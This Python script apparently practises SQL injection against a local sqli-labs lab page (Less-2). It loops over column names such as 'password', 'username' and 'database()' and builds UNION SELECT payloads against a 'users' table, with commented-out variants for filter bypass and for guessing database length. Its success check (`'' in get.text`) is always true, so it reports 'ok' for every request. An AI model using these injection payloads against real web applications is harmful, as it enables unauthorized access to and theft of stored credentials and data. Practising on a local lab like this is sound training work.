#!-*-encoding:utf-8 -*-
import requests

table = ['user','password','root','username','users','email','emails','database()','user()','version()']
table_1 = ['users','password']
num = ['1','2','3','4','5','6','7','8','9','0']
zf = [' ','\'']
zm = ['1234567890abcdefghijklmnopqurstuvwxyz']
fuzz = num+zf
url_start = 'http://localhost/sql/Less-2/index.php?id=1'
head = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"}

for a in table:
    for b in num:
        for d in zf:
            # payload = d+'and/**/1=2/*!union*//**//*!select*/1,'+c+',3/**//*!from*/'+ a + '--+'  # 内联注入
                # payload_a = '%27%20and%20length(database())='+b  # 获取数据库长度
            payload = d+'and 1=2 union select 1,2,'+a+' from users--+'
                # url_a = url_start+payload_a
            url = url_start+payload
            get = requests.get(url,head)
                # print get.text
            print("URL: ",url)
            if '' in get.text:
                print('ok')
            else:
                print('not')


            
